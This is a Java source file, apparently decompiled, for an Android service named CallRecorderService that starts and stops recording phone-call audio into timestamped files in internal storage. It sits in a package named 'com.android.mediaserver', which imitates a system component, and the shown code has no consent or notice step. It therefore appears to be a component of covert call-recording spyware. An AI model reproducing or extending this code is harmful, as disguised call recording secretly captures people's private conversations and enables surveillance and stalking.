package com.android.mediaserver.call;

import android.app.IntentService;
import android.content.Intent;
import com.android.mediaserver.MyApplication;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import timber.log.Timber;

public class CallRecorderService extends IntentService {
  public static final String ACTION_START = "START";
  public static final String ACTION_STOP = "STOP";
  private static CallMediaRecorder mCallMediaRecorder;
  private MyApplication mApplication;
  private String mUsedFile;

  public CallRecorderService() {
    super("CallRecorderService");
  }

  public void onCreate() {
    super.onCreate();
    mApplication = (MyApplication) getApplicationContext();
    mUsedFile = "";
  }

  protected void onHandleIntent(Intent intent) {
    String action = intent.getAction();
    if (action.equals(ACTION_START)) {
      startRecording();
    } else if (action.equals(ACTION_STOP)) {
      stopRecording();
    }
  }

  private void startRecording() {
    Timber.i("start record received", new Object[0]);
    if (mCallMediaRecorder == null) {
      String fileName = String.valueOf(System.currentTimeMillis() / 1000) + ".aac";
      File outputFile = SimpleStorage.getInternalStorage(getApplicationContext())
          .getFile(Config.getInstance(getApplicationContext()).getRecordingsDirectoryName(),
              fileName);
      if (outputFile.exists()) {
        Timber.i("deleting old recording", new Object[0]);
        outputFile.delete();
      }
      try {
        Timber.i("starting actual audio recording", new Object[0]);
        mCallMediaRecorder = new CallMediaRecorder(4);
        mCallMediaRecorder.startRecording(outputFile.getAbsolutePath());
        mUsedFile = fileName;
        AppUtils.setUsedFiles(mApplication, mUsedFile);
      } catch (Exception e) {
        Timber.i("error recording", new Object[0]);
        Timber.e(e.toString(), new Object[0]);
        mUsedFile = "";
        AppUtils.setUsedFiles(mApplication, mUsedFile);
      }
    }
  }

  private void stopRecording() {
    Timber.i("stop record received", new Object[0]);
    mUsedFile = "";
    AppUtils.setUsedFiles(mApplication, mUsedFile);
    if (mCallMediaRecorder != null) {
      try {
        Timber.i("stopping audio recording", new Object[0]);
        mCallMediaRecorder.stopRecording();
        mCallMediaRecorder = null;
      } catch (Exception e) {
        Timber.i("error stopping recording", new Object[0]);
        Timber.e(e.toString(), new Object[0]);
      }
    }
  }
}
